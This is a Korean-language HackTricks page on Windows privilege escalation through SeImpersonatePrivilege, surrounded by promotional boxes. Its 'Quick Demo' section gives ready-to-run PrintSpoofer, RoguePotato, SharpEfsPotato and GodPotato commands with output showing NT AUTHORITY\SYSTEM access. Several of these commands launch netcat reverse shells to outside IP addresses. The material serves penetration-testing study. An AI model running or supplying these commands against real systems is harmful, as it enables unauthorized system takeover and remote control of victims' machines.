# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

<details>

<summary><strong>htARTE (HackTricks AWS Red Team 전문가)로부터 AWS 해킹을 처음부터 전문가까지 배우세요</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사가 HackTricks에 광고되길 원하거나 HackTricks를 PDF로 다운로드**하고 싶다면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [Discord 그룹](https://discord.gg/hRep4RUj7f)** 또는 [텔레그램 그룹](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **HackTricks** 및 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 요령을 공유**하세요.

</details>

## WhiteIntel

<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io)은 **다크 웹**을 기반으로 한 검색 엔진으로, **무료** 기능을 제공하여 회사나 그 고객이 **스틸러 악성 코드**에 의해 **침해**당했는지 확인할 수 있습니다.

WhiteIntel의 주요 목표는 정보 도난 악성 코드로 인한 계정 탈취 및 랜섬웨어 공격을 막는 것입니다.

그들의 웹사이트를 방문하여 엔진을 **무료로** 사용해 볼 수 있습니다:

{% embed url="https://whiteintel.io" %}

---

{% hint style="warning" %}
**JuicyPotato**는 Windows Server 2019 및 Windows 10 빌드 1809 이후에서 작동하지 않습니다. 그러나 [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)를 사용하여 **동일한 권한을 활용하고 `NT AUTHORITY\SYSTEM` 수준의 액세스를 얻을 수 있습니다.** 이 [블로그 포스트](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)는 `PrintSpoofer` 도구에 대해 자세히 설명하며, JuicyPotato가 더 이상 작동하지 않는 Windows 10 및 Server 2019 호스트에서 임의 사용 권한을 악용하는 데 사용할 수 있습니다.
{% endhint %}

## Quick Demo

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
### 로그 포테이토

{% code overflow="wrap" %}
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
{% endcode %}

### SharpEfsPotato
```
SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### GodPotato
```
GodPotato -cmd "cmd /c whoami"
GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
## 참고 자료
* [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
* [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
* [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
* [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
* [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)

## WhiteIntel

<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io)은 **다크 웹**을 기반으로 한 검색 엔진으로, 회사나 그 고객이 **스틸러 악성 코드**에 의해 **침해**당했는지 무료로 확인할 수 있는 기능을 제공합니다.

WhiteIntel의 주요 목표는 정보를 도난하는 악성 코드로 인한 계정 탈취와 랜섬웨어 공격을 막는 것입니다.

그들의 웹사이트를 방문하여 엔진을 **무료**로 사용해 볼 수 있습니다:

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>**htARTE (HackTricks AWS Red Team Expert)**를 통해 제로부터 AWS 해킹을 전문가로 배우세요</strong></summary>

HackTricks를 지원하는 다른 방법:

* **HackTricks에서 귀하의 회사를 광고하거나 PDF로 다운로드하려면** [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왹**](https://peass.creator-spring.com)을 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [디스코드 그룹](https://discord.gg/hRep4RUj7f)** 또는 [텔레그램 그룹](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를 팔로우**하세요.
* **HackTricks** 및 **HackTricks Cloud** 깃허브 저장소에 PR을 제출하여 **해킹 요령을 공유**하세요.

</details>
